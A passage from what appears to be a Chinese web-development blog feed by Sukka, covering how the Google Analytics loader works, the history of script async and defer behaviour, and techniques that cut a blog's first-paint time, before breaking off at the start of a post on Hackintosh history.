class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 